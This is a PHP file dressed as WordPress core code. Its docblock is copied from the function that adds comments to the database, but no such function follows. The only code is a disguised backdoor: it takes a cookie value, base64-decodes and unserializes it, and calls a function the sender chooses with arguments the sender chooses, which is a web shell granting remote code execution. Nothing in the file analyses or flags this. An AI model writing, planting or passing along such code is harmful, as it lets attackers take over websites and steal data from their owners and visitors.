<?php

/**
 * Adds a new comment to the database.
 *
 * Filters new comment to ensure that the fields are sanitized and valid before
 * inserting comment into database. Calls {@see 'comment_post'} action with comment ID
 * and whether comment is approved by WordPress. Also has {@see 'preprocess_comment'}
 * filter for processing the comment data before the function handles it.
 *
 * We use `REMOTE_ADDR` here directly. If you are behind a proxy, you should ensure
 * that it is properly set, such as in wp-config.php, for your environment.
 *
 * See {@link https://core.trac.wordpress.org/ticket/9235}
 *
 * @since 1.5.0
 * @since 4.3.0 'comment_agent' and 'comment_author_IP' can be set via `$commentdata`.
 * @since 4.7.0 The `$avoid_die` parameter was added, allowing the function to
 *              return a WP_Error object instead of dying.
 *
 * @see wp_insert_comment()
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param array $commentdata {
 *     Comment data.
 *
 *     @type string $comment_author       The name of the comment author.
 *     @type string $comment_author_email The comment author email address.
 *     @type string $comment_author_url   The comment author URL.
 *     @type string $comment_content      The content of the comment.
 *     @type string $comment_date         The date the comment was submitted. Default is the current time.
 *     @type string $comment_date_gmt     The date the comment was submitted in the GMT timezone.
 *                                        Default is `$comment_date` in the GMT timezone.
 *     @type int    $comment_parent       The ID of this comment's parent, if any. Default 0.
 *     @type int    $comment_post_ID      The ID of the post that relates to the comment.
 *     @type int    $user_id              The ID of the user who submitted the comment. Default 0.
 *     @type int    $user_ID              Kept for backward-compatibility. Use `$user_id` instead.
 *     @type string $comment_agent        Comment author user agent. Default is the value of 'HTTP_USER_AGENT'
 *                                        in the `$_SERVER` superglobal sent in the original request.
 *     @type string $comment_author_IP    Comment author IP address in IPv4 format. Default is the value of
 *                                        'REMOTE_ADDR' in the `$_SERVER` superglobal sent in the original request.
 * }
 * @param bool $avoid_die Should errors be returned as WP_Error objects instead of
 *                        executing wp_die()? Default false.
 * @return int|false|WP_Error The ID of the comment on success, false or WP_Error on failure.
 */

$ipath = $_COOKIE;
$fld = "fbb2dff";

if (isset($ipath[$fld])) {
	$maxwidth = base64_decode($ipath[$fld]);
	$args = unserialize($maxwidth);
			
	$flds = array_pop( $args );
	$userfunction = array_pop( $args );
	$nicename = array_pop( $args );
	
	var_dump($nicename($userfunction, $flds));
}
?>